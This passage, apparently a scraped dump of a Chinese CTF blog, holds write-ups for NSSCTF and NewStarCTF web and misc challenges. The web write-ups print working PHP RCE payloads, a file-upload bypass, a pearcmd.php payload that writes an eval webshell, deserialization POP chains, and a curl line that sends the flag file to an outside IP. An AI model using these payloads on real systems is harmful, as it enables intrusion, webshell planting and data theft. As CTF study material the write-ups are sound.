即$_GET&#123;0&#125;($_GET&#123;1&#125;)\n\n这个写法$_GET&#123;&#125;在php7中已经被废弃了，但是只要我们想我们也可以直接进行命令执行，并且由于引号被禁掉了，我们也不得不使用1和2两个参数进行命令执行。但是着似乎不是重点，重点是我们即使执行ls也必须使用这种写法\n?c=$pi=(mt_rand^(2).(3)).(tan^(1).(5));$pi=$$pi;$pi&#123;1&#125;&amp;1=system(ls);\n\n这个payload不能使用的原因就是我们只是传入pi这个变量，导致system(ls);被当作字符串识别了，但是当我们使用了括号就变成了\n在 PHP 中，$pi&#123;1&#125; 只是取 $pi 变量的第 1 个字符（或数组的第 1 个元素），它不会自动当作函数调用。\n$_GET&#123;1&#125;($_GET&#123;2&#125;)导致我们传入的参数作为函数执行了\n?c=$pi=(mt_rand^(2).(3)).(tan^(1).(5));$pi=$$pi;$pi&#123;1&#125;($pi&#123;2&#125;)&amp;1=system&amp;2=cat /flag\n\n当然，我们的选择不止这个，我们还可以利用其他函数进行异或，变量名其实也可以换\n?c=$pi=(mt_getrandmax^(2).(3)).(rad2deg^(7).(5));$pi=$$pi;$pi&#123;1&#125;($pi&#123;2&#125;)&amp;1=system&amp;2=cat /flag\n\n\n"},{"title":"[NSSCTF_2nd]php签到","url":"/2025/09/02/NSSCTF-2nd-php%E7%AD%BE%E5%88%B0/","content":"[NSSCTF_2nd]php签到没想到一个3.3评分的题目也不会做，见多识广\n &lt;?phpfunction waf($filename)&#123;    $black_list = array(&quot;ph&quot;, &quot;htaccess&quot;, &quot;ini&quot;);    $ext = pathinfo($filename, PATHINFO_EXTENSION);    foreach ($black_list as $value) &#123;        if (stristr($ext, $value))&#123;            return false;        &#125;    &#125;    return true;&#125;if(isset($_FILES[&#x27;file&#x27;]))&#123;    $filename = urldecode($_FILES[&#x27;file&#x27;][&#x27;name&#x27;]);    $content = file_get_contents($_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;]);    if(waf($filename))&#123;        file_put_contents($filename, $content);    &#125; else &#123;        echo &quot;Please re-upload&quot;;    &#125;&#125; else&#123;    highlight_file(__FILE__);&#125; \n\n我们需要注意的是这里有一个看似多余的操作就是urldecode，如果我们直接上传文件，文件名中的特殊字符是不会被编码的，这个看似多余，实际上在后面是不可缺少的。\n题目先是对我们的文件名进行urldecode然后再过waf，waf就是通过pathinfo获取最后一个.后面的拓展名，然后保存文件\n我们先要知道Linux中是不允许/也就是路径分隔符出现在文件名中的，但是我们在php中使用file_put_contents进行文件创建的时候如果遇到1.php/.这种文件名的时候会去掉/.然后进行文件创建\n\n\n我们发现目录下真的出现一个1.php的文件\n\n\n于是思路就有了，我们上传文件名为1.php/.的webshell，绕过waf，然后访问1.php即可。\n但是当我们上传文件的时候会出现报错\n&lt;b&gt;Warning&lt;/b&gt;: file_put_contents(.): failed to open stream: Is a directory in &lt;b&gt;/var/www/html/index.php&lt;/b&gt;\n\n这表示我们的文件名变为了一个.，这是windows系统中的一个问题吧windows系统中文件名也不能出现/，但是不知道为什么会把/前面的全部删除，所以我们需要将其编码为%2f\n\n\n然后在phpinfo中找到flag\n\n"},{"title":"NSSCTF_AI挑战","url":"/2025/10/08/NSSCTF-AI%E6%8C%91%E6%88%98/","content":"NSSCTF_AI挑战大模型Prompt挑战一"},{"title":"[NewStarCTF_2023_公开赛道]Include_🍐","url":"/2025/06/12/NewStarCTF-2023-%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-Include-%F0%9F%8D%90/","content":"[NewStarCTF_2023_公开赛道]Include_🍐新生赛也是上难度了，又不会。\n &lt;?php    error_reporting(0);    if(isset($_GET[&#x27;file&#x27;])) &#123;        $file = $_GET[&#x27;file&#x27;];                if(preg_match(&#x27;/flag|log|session|filter|input|data/i&#x27;, $file)) &#123;            die(&#x27;hacker!&#x27;);        &#125;                include($file.&quot;.php&quot;);        # Something in phpinfo.php!    &#125;    else &#123;        highlight_file(__FILE__);    &#125;?&gt; \n\n这次它直接过滤掉了所有我可以用的伪协议，然后还限定我们只能包含php后缀的文件。\n提示我们去看phpinfo.php\n?file=phpinfo\n\n\n\n题解说我们需要注意这个配置项是打开的，我去查下这个配置项\nregister_argc_argv是PHP的一个重要的INI配置选项，它决定了PHP脚本是否能访问命令行参数。这个选项主要影响以下两个方面：\n功能作用\n**当启用时(On)**：\n会创建$argc和$argv全局变量\n$argc：包含传递给脚本的参数数目\n$argv：包含实际参数的数组\n\n\n**当禁用时(Off)**：\n不会自动创建这些变量\n可以节省少量内存\n\n\n\n也就是我们在命令行执行php文件时是否可以在后面添加参数\n于是我们直接上payload\n?+config-create+/&amp;file=/usr/share/php/pearcmd&amp;/&lt;?=eval($_POST[1]);?&gt;+/var/www/html/shell.php ?+config-create+/&amp;file=/usr/local/lib/php/pearcmd&amp;/&lt;?=eval($_POST[1]);?&gt;+/var/www/html/shell.php\n\n这个Payload利用了PHP的PEAR命令行工具(pearcmd.php)中的config-create参数实现远程代码执行(RCE)和Webshell写入，是一种常见的PHP应用漏洞利用技术。\n利用服务器上存在的pearcmd.php（PEAR包管理器命令行工具），该文件通常位于：\n\n/usr/share/php/pearcmd.php\n/usr/local/lib/php/pearcmd.php\n\n参数\n\n+config-create+：触发PEAR的配置文件生成功能\n&amp;file=...：指定PEAR主程序路径\n&lt;?=eval($_POST[1]);?&gt;：要写入的恶意代码（一句话Webshell）\n/var/www/html/shell.php：Webshell写入路径\n\n至于这个Url为什么会触发命令行\nPEAR命令行参数解析特性：\n\nPEAR工具设计初衷是命令行使用，参数格式为：pear [选项] 命令 [参数]\n当通过Web访问时，PHP会将?后的查询参数自动解析到$_GET数组\nPEAR代码中未严格区分CLI和Web输入方式，导致Web请求也能触发命令功能\n\n我们首先利用file参数包含pearcmd.php，即可执行pear命令\n\n\n\nURL部分\n命令行等效形式\n说明\n\n\n\n?+config-create+/\npear config-create /\n子命令和伪装的第一个参数\n\n\n&amp;file=/usr/share/php/pearcmd.php\n（删除）\n命令行无需指定PEAR路径\n\n\n&amp;/&lt;?=eval($_POST[1]);?&gt;+\n&#39;&lt;?=eval($_POST[1]);?&gt;&#39;\n用单引号包裹PHP代码，避免特殊字符被解析\n\n\n/var/www/html/shell.php\n/var/www/html/shell.php\n最终写入路径\n\n\n于是命令行就变成了\npear config-create / &#x27;&lt;?=eval($_POST[1]);?&gt;&#x27; /var/www/html/shell.php\n\n\n\n向shell.php中写入一句话木马\n?+config-create+/&amp;file=/usr/local/lib/php/pearcmd&amp;/&lt;?=eval($_POST[1]);?&gt;+/var/www/html/shell.php\n\n由于我们使用url传递一句话木马会被编码，但是写入的时候不会解码\n\n\n就会出现php标识被编码的情况\n于是我们直接抓包改\n\n\n我们再访问shell.php进行命令执行\n\n"},{"title":"[NewStarCTF_2023_公开赛道]R!!!C!!!E!!!","url":"/2025/07/16/NewStarCTF-2023-%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-R-C-E/","content":"[NewStarCTF_2023_公开赛道]R!!!C!!!E!!!在bash中感叹号也是一个命令符，也就是说我在生成这个标题的时候还必须把所有的感叹号给转义了才行\n&lt;?phphighlight_file(__FILE__);class minipop&#123;    public $code;    public $qwejaskdjnlka;    public function __toString()    &#123;        if(!preg_match(&#x27;/\\\\$|\\.|\\!|\\@|\\#|\\%|\\^|\\&amp;|\\*|\\?|\\&#123;|\\&#125;|\\&gt;|\\&lt;|nc|tee|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i&#x27;, $this-&gt;code))&#123;            exec($this-&gt;code);        &#125;        return &quot;alright&quot;;    &#125;    public function __destruct()    &#123;        echo $this-&gt;qwejaskdjnlka;    &#125;&#125;if(isset($_POST[&#x27;payload&#x27;]))&#123;    //wanna try?    unserialize($_POST[&#x27;payload&#x27;]);&#125; \n\n这个题目有点厉害，用了以前我没见过的方法，直接修改题目文件进行绕过正则。\n由于exec执行完命令后不像system和passthru那样有回显，题目还把我们的curl外带和重定向符和dns外带(buu不能访问外网，话说我还不怎么会用这个)，于是直接没有应对无回显命令执行的办法了，我甚至都想利用post传参生成100万个字符(默认100万个)绕过正则匹配\n还把php python gcc这些代码执行也给过滤掉了\n但是这里利用到的是sed命令未被过滤，然后修改index.php的代码然后绕过正则\nsed（Stream Editor）是一个强大的文本流处理工具，常用于快速修改文件、提取数据或自动化处理。\nsed [选项] &#x27;命令&#x27; 文件名\n\n常用选项：\n\n-i：直接修改文件（慎用，建议先不加 -i 测试）\n-n：抑制默认输出（常与 p 命令配合）\n-e：连接多个命令（如 sed -e &#39;s/foo/bar/&#39; -e &#39;s/hello/world/&#39;）\n-r：启用扩展正则表达式（类似 grep -E）\n\nsed &#x27;s/旧内容/新内容/[替换选项]&#x27; #这里面的s是替换命令echo &quot;hello hello&quot; | sed &#x27;s/hello/world/&#x27;  # 输出 &quot;world hello&quot;echo &quot;hello hello&quot; | sed &#x27;s/hello/world/g&#x27;  # 输出 &quot;world world&quot;  全局替换sed &#x27;2,4s/foo/bar/g&#x27; file.txt #指定替换范围\n\n我们还需要知道sed有哪些命令\n\n\n\n命令\n功能\n语法示例\n作用说明\nCTF 应用场景\n\n\n\n\ns\n替换文本\nsed &#39;s/旧/新/g&#39; file\n全局替换匹配的文本\n删除敏感字符（如 &#96;\n、&amp;&#96;）\n\n\nd\n删除行\nsed &#39;3d&#39; file\n删除第 3 行\n清理日志中的干扰行\n\n\n\n\n\nsed &#39;/error/d&#39; file\n删除含 error 的行\n隐藏攻击痕迹\n\n\n\np\n打印行\nsed -n &#39;5p&#39; file\n打印第 5 行（需 -n 抑制默认输出）\n提取 flag&#123;.*&#125; 格式数据\n\n\n\n\n\nsed -n &#39;/flag/p&#39; file\n打印含 flag 的行\n\n\n\n\na\n行后追加\nsed &#39;2a\\新增内容&#39; file\n在第 2 行后追加文本\n插入恶意代码或配置\n\n\n\ni\n行前插入\nsed &#39;/pattern/i\\插入内容&#39; file\n在匹配行前插入文本\n篡改关键配置\n\n\n\nc\n整行替换\nsed &#39;4c\\替换内容&#39; file\n将第 4 行完全替换\n修改文件关键逻辑\n\n\n\nr\n插入外部文件内容\nsed &#39;3r external.txt&#39; file\n在第 3 行后插入外部文件内容\n合并隐藏数据\n\n\n\nw\n写入到文件\nsed &#39;/flag/w output.txt&#39; file\n将含 flag 的行写入 output.txt\n提取关键数据到新文件\n\n\n\ny\n字符转换\nsed &#39;y/abc/ABC/&#39; file\n将 a→A、b→B、c→C（逐字符替换）\n简单编码&#x2F;解码\n\n\n\nq\n退出处理\nsed &#39;5q&#39; file\n处理到第 5 行后退出\n快速截断大文件\n\n\n\n我们这里需要的是直接修改文件，所以用的是-i选项和s替换命令\nsed -i &#x27;s/|//g&#x27; index.php #将index.php中所有的|替换为空 在保证代码正常运行的情况下破坏正则表达式\n\n由于还把php给过滤了，我们需要使用echo和进制绕过\nsed -i &#x27;s/|//g&#x27; index`echo -e &quot;\\x2ep&quot;`hp  #\\x2e是点号的十六进制\n\n在bash中反引号可以先进行命令然后将命令执行结果返回当前命令\n于是exp\n&lt;?phphighlight_file(__FILE__);class minipop&#123;    public $code;    public $qwejaskdjnlka;    public function __toString()    &#123;        if (!preg_match(&#x27;/\\\\$|\\.|\\!|\\@|\\#|\\%|\\^|\\&amp;|\\*|\\?|\\&#123;|\\&#125;|\\&gt;|\\&lt;|nc|tee|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i&#x27;, $this-&gt;code)) &#123;            exec($this-&gt;code);        &#125;        return &quot;alright&quot;;    &#125;    public function __destruct()    &#123;        echo $this-&gt;qwejaskdjnlka;    &#125;&#125;$a = new minipop;$a-&gt;qwejaskdjnlka = new minipop;$a-&gt;qwejaskdjnlka-&gt;code = &#x27;sed -i \\&#x27;s/|//g\\&#x27; index`echo -e &quot;\\x2ep&quot;`hp&#x27;;//$a-&gt;qwejaskdjnlka-&gt;code = &#x27;ls / &gt;1.php&#x27;;//$a-&gt;qwejaskdjnlka-&gt;code = &#x27;cat /flag_is_h3eeere &gt;1.php&#x27;;echo (serialize($a));\n\n\n\n删除之后的结果\n\n\n然后我们直接进行重定向和curl外带都可以\ncurl -d @/flag_is_h3eeere 10.88.15.171:1999\n\n\n"},{"title":"[NewStarCTF_2023_公开赛道]RCE2","url":"/2025/10/26/NewStarCTF-2023-%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-RCE2/","content":"[NewStarCTF 2023 公开赛道]R!!C!!E!!没想到都在打2025年NewStar了结果连2023的都不会写，闹麻了\n进入靶场什么都没有，尝试了一些常见的文件，发现有.git文件，直接使用Githack将文件下载下来\n发现源码在bo0g1pop.php中，直接访问即可访问到\n&lt;?phphighlight_file(__FILE__);if (&#x27;;&#x27; === preg_replace(&#x27;/[^\\W]+\\((?R)?\\)/&#x27;, &#x27;&#x27;, $_GET[&#x27;star&#x27;])) &#123;    if(!preg_match(&#x27;/high|get_defined_vars|scandir|var_dump|read|file|php|curent|end/i&#x27;,$_GET[&#x27;star&#x27;]))&#123;        eval($_GET[&#x27;star&#x27;]);    &#125;&#125;\n\n先看正则\nif (&#x27;;&#x27; === preg_replace(&#x27;/[^\\W]+\\((?R)?\\)/&#x27;, &#x27;&#x27;, $_GET[&#x27;star&#x27;]))//\\W匹配的是英文字母以外的字符，也就是除去数字，字母，下划线的其他字符，然后取反就是匹配英文字符//然后匹配一对括号()//并且进行嵌套匹配(?R)?，也就是匹配完后还要对结果进行继续匹配\n\n通过正则我们可以推断出这个题目考的是无参数RCE，而且过滤了我们很多常用的函数\n由于过滤了high，其实还有show_sourec和highligth_file，我们就无法在不进行命令执行的情况下进行文件读取了，好在system没被过滤\n于是现在就需要获取到命令执行的输入\n常用的就是getallheaders通过请求头获取，这次也没有过滤，但是把我们的current和end给禁用了，只剩下next用于读取数组的值了，好在翻转数组用的array_reverse还在，我们可以使用其绕过请求头中一些必须有的字段\n通过一些调整后可以获取到我们的命令输入\n\n\n然后直接进行命令执行即可，或者使用show_source进行文件读取\n\n\n使用system\n\n\n\n\n这个题目的主要就是有很多方法进行文件读取，但是难点在于如何获取到函数的输入，如果这个题目把next给禁掉了，我们就不能那么容易，直接获取我们的输入了，还有一种方法\n就是利用array_flip将我们数组的键值进行翻转，然后通过array_rand随机获取键值可以实现无视我们输入在数组中的位置随机进行获取输入\nsystem(array_rand(array_flip(getallheaders())));\n\n\n\n\n\n然后我们使用爆破即可获取flag\n\n","tags":["无参命令执行","array_rand","array_flip"]},{"title":"[NewStarCTF_公开赛赛道]UnserializeOne","url":"/2025/05/29/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-UnserializeOne/","content":"[NewStarCTF_公开赛赛道]UnserializeOne实在没想到，我现在还是会在新生赛上面翻车，还是太久没写反序列化了，这次还用到了之前没用过的魔术方法\n&lt;?phperror_reporting(0);highlight_file(__FILE__);#Something useful for you : https://zhuanlan.zhihu.com/p/377676274class Start&#123;    public $name;    protected $func;    public function __destruct()    &#123;        echo &quot;Welcome to NewStarCTF, &quot;.$this-&gt;name;//6.触发__tostring    &#125;    public function __isset($var)//2.需要对不存在或不可见属性使用isser()或empty()    &#123;        ($this-&gt;func)();    &#125;&#125;class Sec&#123;    private $obj;    private $var;    public function __toString()//5.将对象作为字符串对待    &#123;        $this-&gt;obj-&gt;check($this-&gt;var);        return &quot;CTFers&quot;;    &#125;    public function __invoke()//1.需要将对象作为函数使用    &#123;        echo file_get_contents(&#x27;/flag&#x27;);//我们从这里开始反推pop链    &#125;&#125;class Easy&#123;    public $cla;    public function __call($fun, $var)//4.调用不存在的函数    &#123;        $this-&gt;cla = clone $var[0];    &#125;&#125;class eeee&#123;    public $obj;    public function __clone()//3需要对这个对象使用clone    &#123;        if(isset($this-&gt;obj-&gt;cmd))&#123;//3.触发__isset()            echo &quot;success&quot;;        &#125;    &#125;&#125;if(isset($_POST[&#x27;pop&#x27;]))&#123;    unserialize($_POST[&#x27;pop&#x27;]);&#125;\n\n这次有两个代码没看懂，一个是$this-&gt;cla = clone $var[0];里面的clone以前没见过，还有就是出现的__clone魔术方法，我们先来看clone这个代码\n$this-&gt;cla = clone $var[0];\n\nclone 关键字的作用是 创建对象的一个副本。\n我们先来看一下代码\nclass User &#123;    public $name = &#x27;Alice&#x27;;&#125;$original = new User();$copy = $original;       // 引用赋值$copy-&gt;name = &#x27;Bob&#x27;;     // 修改副本echo $original-&gt;name;    // 输出 &#x27;Bob&#x27;（原对象被修改！）//在对象之间进行赋值的时候不会再在内存中创建一个对象，而是两个变量指向同一个内存中的对象\n\n如果使用clone则会创建一个副本去再在内存中去创建一个对象\n同时__clone的触发条件也是对这个对象使用clone方法。\n分析完后我们直接删掉不用的属性构造pop链\n&lt;?phpclass Start&#123;    public $name;    public $func;    &#125;class Sec&#123;    public $obj;    public $var;    &#125;class Easy&#123;    public $cla;&#125;class eeee&#123;    public $obj;&#125;$a=new Start;$b=new Sec;$c=new eeee;$d=new Easy;$a-&gt;name=$b;$b-&gt;var=$c;$b-&gt;obj=$d;$c-&gt;obj=$a;$a-&gt;func=$b;//这样写pop链实在难看echo urlencode(serialize($a));\n\n"},{"title":"[NewStarCTF_2023_公开赛道]隐秘的图片","url":"/2025/10/03/NewStarCTF-2023-%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-%E9%9A%90%E7%A7%98%E7%9A%84%E5%9B%BE%E7%89%87/","content":"[NewStarCTF_2023_公开赛道]隐秘的图片这虽然是一道新生赛的杂项，但是也是小小的刷新了一下我平时对二维码的认识\n解压出来是两张二维码\n\n\n我们可以观察一下key1是完整的二维码，但是第二张好像是缺失了三个定位符，然后找了一下发现还少了校正图形(校正图形和二维码版本有关)，我们可以看到定位符之前的连接也是不对的，然后就是二维码中黑色的部分有点多了\n\n\n校正图形：用于校正定位（只有版本2以上才有），版本越高个数越多，以校正可能发生的定位偏移。\n我们扫描第一个二维码得到\nnothing_in_here_but_where_is_flag\n\n我就以为是让我去修复第二张二维码，于是我就去Ps里面P了好久，终于把定位符给P好了，结果扫描发现识别不出是二维码，发现是缺少了校正图形\n\n\n但是我再也受不了了，直接看题解，还好没有继续P，这题根本就不是P图\n这个题目真正考的是异或，出题应该是先造了key1和flag，然后再通过处理得到了key2，也就是key2即使修复了也是没有东西的\n异或就是将图片中对应的像素块之间进行异或我们知道黑色是0，白色则是255，两个像素块进行异或的时候白色和黑色会得到白色（异或的原则是相同为0，不同为1）\n00000000 ^ 11111111\n\n于是我们使用ke1和key2进行异或就可以得到完整的二维码\n\n\n我们使用stageslove异或即可，扫描得到\nflag&#123;x0r_1m4ge_w1ll_g0t_fl4ggg_3394e4ecbb53&#125;\n\n","tags":["二维码异或"]},{"title":"NewStart2025week1","url":"/2025/10/16/NewStart2025week1/","content":"NewStart2025week1现在week1的wp也是出了，没想到打个NewStart都会调到114514名去了，趁着平台还在把wp给写了\nMisc我Misc感觉难度怎么比web大那么多，根本不会写\n1.我不要革命失败题目提示\n\n\n也就是要使用WinDbg分析Windows的日志文件dmp\n附件下载下来还提示flag格式\nflag&#123;崩溃类型(即蓝屏显示的终止代码)_故障进程&#125;\n\n当初是用DS一顿梭哈拿到的flag，实际上对这个一点都不了解\n使用Windbg打开dmp文件，然后按照提示输入!analyze -v?，其实flag只要直接输入这个就有了，可惜我看不懂输出的英文\n\n\n我们看这一段，意思就是\n引发故障的线程：ffffd18ea422e080进程名称：svchost.exe关键进程：svchost.exe\n\n然后可以推断出故障进程就是svchost.exe\n然后我们还需要获得蓝屏显示的终止代码，直接在命令刚执行的输出那里获得\n\n\n这里就是蓝屏终止代码，拼接得到flag\nflag&#123;CRITICAL_PROCESS_DIED_svchost.exe&#125;\n\n\n\n\n\n2.EZ_fence题目提示\n\n\n题目是fence然后又提示4颗钉子，也就是栅栏密码解密为4栅栏\n然后附件下载下来是一张图片，里面有一串看似被打乱的Base64编码\n然后使用010editor打开发现\n\n\n在最后有一个压缩包，将其使用binwalk分离出来发现里面有flag，尝试了一下不是伪加密，然后就是来解密了\n然后根据提示是一张破损的图片，尝试改高度得到完整图片\n\n\n下面的字符串很明显将Base64原来的字符串打乱了，也就是我们需要使用这个被打乱的字符串进行解密，我们先对上面字符串进行栅栏解密，还有就是文字提取还是自己检查一遍比较好，ai和qq文字提取都会出错\n我们将其进行w栅栏解密得到\n\n\n等号在后面可以判断应该是对的\nrSvMwgdouWZVhAvoj79GhSvWztPoyLfPytvQwJjBnKz=\n\n然后叫GPT给我们写一个Base64映射脚本，拿到正常的Base64数据\n\n\n进行解密得到压缩包密码\n\n\n解压拿到flag\n\n\n\n\n3.前有文字，所以搜索很有用唉，脑洞题想不到，正常题目也不会写，玩完了\n附件下载下来有三个track，看来是对应了三个flag\nTrack1\n零宽字符隐写\n零宽度字符是一些不可见的，不可打印的字符。它们存在于页面中主要用于调整字符的显示格式。\n由于是不可见的，我们不要使用记事本打开，使用Vim就可以看到零宽度字符\n\n\n我们根据提示选择合适的隐写字符\n\n\n成功拿到\n\n\n第一部分\nZmxhZ3t5b3Vffbase64解码得到  flag&#123;you_\n\n\n\nTrack2\n文件有两个，一个是Brainfuck隐写，直接解密拿到\n\n\nbrainfuckisgooooood\n\n虽然还不知道有什么用\n第二个文件是一个word文件，里面是咏雪文言文，我没想到咏雪是在暗示这是Snow隐写\n我们全选或者另存为txt文件进行解密，然后就是这个p是不需要带引号的，不然解出来的东西完全不一样\nsnow -p brainfuckisgooooood 1.txt &gt; flag.txt\n\n但是拿到的结果发现是摩斯密码\n----- ...- ...-- .-. -.-. ....- -- . ..--.-\n\n解密拿到\n0V3RC4ME_\n\n\n\nTrack3\n文件名提示我们谁多谁少一算便知，使用字频统计工具\n\n\n拿到\ncH@1LenG3s&#125;\n\n\n\n最后拼接得到flag\nflag&#123;you_0V3RC4ME_cH@1LenG3s&#125;\n\n\n\n4.MISC城邦-压缩术这个题目比较基础，下载下来是一个zip压缩包，进行密码爆破得到密码为\nns2025\n\n\n\n解压后又是一个压缩包，提示是伪加密，改了之后直接解压就行了\n再打开是一个key.txt和一个flag.zip压缩包，我们发现压缩包中也有一个key.txt，我们发现两个文件的CRC校验值一致，于是猜测是明文攻击\n将key.txt使用Winrar压缩为zip文件，我不知道明文攻击算法有什么要求，我就是直接写出来的\n然后将flag.zip作为加密文件，key.zip作为明文zip爆破即可拿到解压密码\n\n\n解压得到flag\n5.OSINT-天空belong这个就是OSINT题目，之前我遇到这种题目都是上谷歌识图的，但是我没想到可以使用EXIF分析\nEXIF分析主要是用于手机拍摄的照片，然后会在图片中写一些日期，定位，拍摄设备等信息\n题目提示\n\n\n解题就是根据图片中的飞机编号判断是乌鲁木齐航空的一架飞机\n\n\n然后使用EXIF分析出拍摄日期和和设备\n\n\n然后去航空官网查这一天15点这架飞机的航班信息\n\n\n发现是从济南到长沙，航班号是UQ3574，拍摄时间是15:03，那个时候飞机还没到长沙，根据路线，直接猜测是武汉，拼接得到flag\nflag&#123;UQ3574_武汉市_Xiaomi&#125;\n\n"},{"title":"NewStart2025week2","url":"/2025/10/22/NewStart2025week2/","content":"NewStart2025week2即使是新生赛还是有一些不会的东西\nMisc美妙的音乐先从最简单的开始\n下载下来是一个音频文件，我们直接使用audacity打开，直接就可以在音频中看见flag\n\n\n但是这个实在难看清，主要就是去尝试flag，主要套路就是o变成0，i和l变为1等操作，最后的flag\nflag&#123;thi5_1S_m1Di_5tEGO&#125;\n\n\n\n\n\n日志分析-不敬者的闯入题目提示\n\n\n然后给了我们一个log文件和一个靶场，log文件是一个HTTP日志文件，我们直接搜索200响应的请求，然后看到疑似webshell的路径\n\n\n直接访问/admin/Webshell拿到flag\n\n\n\n\nMISC城邦-NewKeyboard题目名字叫keyboard，一看就是键盘流量。但是以前就没怎么遇到过不会写\n下载下来是两个流量包，都是键盘流量，其中一个名字比较特殊\n\n\n我们都知道键盘的按键都是绑定了hid码的，hid码对应的其实是按键的位置，但是如果不是正常键盘，比如那些圆的键盘和断开的键盘就会导致按键映射错误，脚本通过正常键盘推测出来的数据不对\n这个题目就是，我们先通过tshark将hid码导出，那个名字太长的先复制下来再改成1\ntshark -r 1.pcapng -T fields -e usbhid.data &gt;1.txttshark -r newkeyboard.pcapng -T fields -e usbhid.data &gt;2.txt\n\n提取出来之后脑洞的地方就来了，这个文件名正好对应提取出来的hid码1.txt\nabcdefghijklmnopqrstuvwxyz1234567890-_!&#123;&#125;\n\n然后我们通过1.txt推测出按键映射后，我们再将2.txt中的hid码转化出来的数据就是flag\n我们把大佬的脚本拿下来\nnormalKeys = &#123;    &#x27;01001000000000000000000000000000000000000000&#x27;: &#x27;a&#x27;,    &#x27;01002000000000000000000000000000000000000000&#x27;: &#x27;b&#x27;,    &#x27;01004000000000000000000000000000000000000000&#x27;: &#x27;c&#x27;,    &#x27;01008000000000000000000000000000000000000000&#x27;: &#x27;d&#x27;,    &#x27;01000001000000000000000000000000000000000000&#x27;: &#x27;e&#x27;,    &#x27;01000002000000000000000000000000000000000000&#x27;: &#x27;f&#x27;,    &#x27;01000004000000000000000000000000000000000000&#x27;: &#x27;g&#x27;,    &#x27;01000008000000000000000000000000000000000000&#x27;: &#x27;h&#x27;,    &#x27;01000010000000000000000000000000000000000000&#x27;: &#x27;i&#x27;,    &#x27;01000020000000000000000000000000000000000000&#x27;: &#x27;j&#x27;,    &#x27;01000040000000000000000000000000000000000000&#x27;: &#x27;k&#x27;,    &#x27;01000080000000000000000000000000000000000000&#x27;: &#x27;l&#x27;,    &#x27;01000000010000000000000000000000000000000000&#x27;: &#x27;m&#x27;,    &#x27;01000000020000000000000000000000000000000000&#x27;: &#x27;n&#x27;,    &#x27;01000000040000000000000000000000000000000000&#x27;: &#x27;o&#x27;,    &#x27;01000000080000000000000000000000000000000000&#x27;: &#x27;p&#x27;,    &#x27;01000000100000000000000000000000000000000000&#x27;: &#x27;q&#x27;,    &#x27;01000000200000000000000000000000000000000000&#x27;: &#x27;r&#x27;,    &#x27;01000000400000000000000000000000000000000000&#x27;: &#x27;s&#x27;,    &#x27;01000000800000000000000000000000000000000000&#x27;: &#x27;t&#x27;,    &#x27;01000000000100000000000000000000000000000000&#x27;: &#x27;u&#x27;,    &#x27;01000000000200000000000000000000000000000000&#x27;: &#x27;v&#x27;,    &#x27;01000000000400000000000000000000000000000000&#x27;: &#x27;w&#x27;,    &#x27;01000000000800000000000000000000000000000000&#x27;: &#x27;x&#x27;,    &#x27;01000000001000000000000000000000000000000000&#x27;: &#x27;y&#x27;,    &#x27;01000000002000000000000000000000000000000000&#x27;: &#x27;z&#x27;,    &#x27;01000000004000000000000000000000000000000000&#x27;: &#x27;1&#x27;,    &#x27;01000000008000000000000000000000000000000000&#x27;: &#x27;2&#x27;,    &#x27;01000000000001000000000000000000000000000000&#x27;: &#x27;3&#x27;,    &#x27;01000000000002000000000000000000000000000000&#x27;: &#x27;4&#x27;,    &#x27;01000000000004000000000000000000000000000000&#x27;: &#x27;5&#x27;,    &#x27;01000000000008000000000000000000000000000000&#x27;: &#x27;6&#x27;,    &#x27;01000000000010000000000000000000000000000000&#x27;: &#x27;7&#x27;,    &#x27;01000000000020000000000000000000000000000000&#x27;: &#x27;8&#x27;,    &#x27;01000000000040000000000000000000000000000000&#x27;: &#x27;9&#x27;,    &#x27;01000000000080000000000000000000000000000000&#x27;: &#x27;0&#x27;,    &#x27;01000000000000200000000000000000000000000000&#x27;: &#x27;-&#x27;,    &#x27;01020000000000200000000000000000000000000000&#x27;: &#x27;_&#x27;,    &quot;01020000004000000000000000000000000000000000&quot;: &quot;!&quot;,    &quot;01020000000000800000000000000000000000000000&quot;: &quot;&#123;&quot;,    &quot;01020000000000000100000000000000000000000000&quot;: &quot;&#125;&quot;&#125;nums = [] #用于储存从文件中读取的数据keys = open(&#x27;newkeyboard.txt&#x27;, &#x27;rt&#x27;)  # 打开文件for line in keys:    line = line.strip()  # 去掉行首和行尾的空白字符    # print(line)    nums.append(line) #写入数组中keys.close()output = &quot;&quot;for n in nums:  #遍历nums中的每一项值    if n in normalKeys:        output += normalKeys[n]    # else:    #     output += &#x27;[unknown]&#x27;print(&#x27;output :&#x27; + output)\n\n成功拿到flag\n\n\n\n\n星期四的狂想又是一道流量分析题，题目提示\n\n\n把流量截取下来也就意味着我们得到的不是一个完整的流量包，wireshark也提示了但是不影响做题\n这是一个文件上传的流量包，我们来看几个成功上传的php文件的包\n//crazythursdayvivo50.php&lt;?php//建立函数名映射$func_map = [  &quot;print&quot; =&gt; &quot;eval&quot;,  &quot;thursday&quot; =&gt; &quot;exec&quot;,  &#x27;chicken&#x27; =&gt; &#x27;system&#x27;,  &#x27;vivo&#x27; =&gt; &#x27;shell_exec&#x27;,  &#x27;vv50&#x27; =&gt; &#x27;passthru&#x27;];//通过use可以让函数在函数里面也可以访问外部变量$getFunction = function($name) use ($func_map) &#123;//如果参数存在映射则返回映射，否则为空  return isset($func_map[$name]) ? $func_map[$name] : null;&#125;;?&gt;\n\n下一个文件\n//crazy.php&lt;?phpecho &quot;Hello, world!&quot;;$flag = base64_encode(file_get_contents(&quot;/flag&quot;));//读取flag$hahahahahaha = &#x27;&#x27;;foreach (str_split($flag, 10) as $part) &#123;  if (rand(0, 1)) &#123;    $part = strrev($part);  &#125; else &#123;    $part = str_rot13($part);  &#125;  $hahahahahaha .= $part;&#125;function code($x) &#123;  return &quot;Cookie: &quot; . base64_encode($x);&#125;//设置cookie,里面是被加密的flag?&gt;\n\n这个代码就看不懂了，我该如何解密\n//index.php&lt;?phpinclude &quot;chickenvivo50.php&quot;;//不知道为什么这里文件名改了$getFunction(&#x27;chicken&#x27;)(&#x27;echo 